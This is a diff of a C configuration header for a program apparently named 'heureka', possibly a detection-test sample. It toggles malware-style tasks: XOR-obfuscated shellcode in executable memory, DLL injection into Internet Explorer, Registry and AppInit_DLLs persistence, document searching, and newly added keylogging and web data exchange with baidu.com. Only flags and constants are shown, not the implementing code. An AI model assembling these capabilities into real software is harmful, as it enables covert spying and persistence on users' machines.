@@ -1,14 +1,16 @@
 // compilation setup
 #define SHELLCODE 1				// The binary will contain shellcode
-#define SHELLCODE_XOR 1				// The binary will contain XOR obfuscated shellcode
+#define SHELLCODE_XOR 1			// The binary will contain XOR obfuscated shellcode
 #define REMOTE_HOST 1			// The binary will contain reference to a remote host 
 #define ALLOC_RWX_CALL 1		// Task: Allocate memory, write and execute SHELLCODE 
-#define ALLOC_RWX_XOR_CALL 1		// Task: Allocate memory, write and execute XOR obfustcated SHELLCODE 
+#define ALLOC_RWX_XOR_CALL 1	// Task: Allocate memory, write and execute XOR obfustcated SHELLCODE 
 #define WRITE_LOG 1				// Task: Write system information to temporary directory
 #define DLL_INJECT_IE 1			// Task: Inject DLL (HEUREKADLL_PATH) into an Internet Explorer(IE_PATH) process
 #define SET_STARTUP_REGISTRY 1  // Task: Register heureka as a startup application in the Registry
 #define DLL_INJECT_REGISTRY 1	// Task: Set up AppInitDLL registry entry
 #define SEARCH_DOCS 1			// Task: Search for documents
+#define WEB_SEND_RECV 1			// Task: Send/Receive data to/from a website
+#define HOOK_KEYBOARD 1     // Task: Keylogger
 #define IE_PATH "C:\\Program Files\\Internet Explorer\\iexplore.exe"
 #define HEUREKADLL_PATH "Z:\\heureka\\heureka\\Release\\heurekadll.dll"
 
@@ -68,7 +70,8 @@ const unsigned char XOR_key=0x42;
 #endif
 
 #if REMOTE_HOST==1
-const char remote_url[]="http://baidu.com";
+const WCHAR remote_host[]=L"baidu.com";
+const WCHAR remote_resource[]=L"/HeurekaTest";
 #endif
 
 #if SEARCH_DOCS==1
